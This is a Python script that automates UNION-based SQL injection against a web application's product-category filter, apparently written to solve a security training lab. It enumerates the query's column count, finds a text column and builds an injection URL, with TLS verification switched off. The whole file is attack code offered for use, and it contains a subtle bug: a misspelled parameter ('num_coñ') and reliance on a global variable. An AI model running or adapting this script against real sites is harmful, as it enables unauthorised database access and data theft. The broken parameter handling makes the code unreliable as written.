import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# proxies = {"http":"http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def exploit_sqli_column_number(url, path):
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        r = requests.get(url+path+sql_payload+"-- - ", verify=False)
        if r.status_code == 200: #also can evaluate 500 status code
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1
        
    return False

def exploit_sqli_find_string_column(num_col, path):
    test_string = "'a'"
    
    for i in range(num_col):
        array_null_string = ['NULL']*num_col
        array_null_string[i] = test_string
        sql_payload = "'+UNION+SELECT+" + ','.join(map(str,array_null_string)) + "--"
        r = requests.get(url + path + sql_payload + "-- - ", verify=False)
        if r.status_code == 200:
            return i+1
    return False

def exploit_sqli_string_field(url,path,num_coñ, num_col_string, string_to_find):
    
    array_null_string = ["NULL"] * num_col
    array_null_string[num_col_string-1] = "'" + string_to_find + "'"
    sql_payload = "'+UNION+SELECT+" + ','.join(map(str,array_null_string)) + "--"
    r = requests.get(url + path + sql_payload + "-- - ", verify=False)
    res = r.text
    if string_to_find.strip('\'') in res:
        return (url + path + sql_payload + "-- - ")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns....")

    path = "filter?category=Accesories"
    string_to_find = "mPdJaT"

    num_col = exploit_sqli_column_number(url,path)
    num_col_string = exploit_sqli_find_string_column(num_col,path)
    url_attack = exploit_sqli_string_field(url, path, num_col, num_col_string, string_to_find)

    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        print("[+] The number of column that contains an string is " + str(num_col_string) + ".")
        print("[+] The URL must be attacked is: " +  url_attack)
    else:
        print("[-] The SQLi attack was not successful.")
    
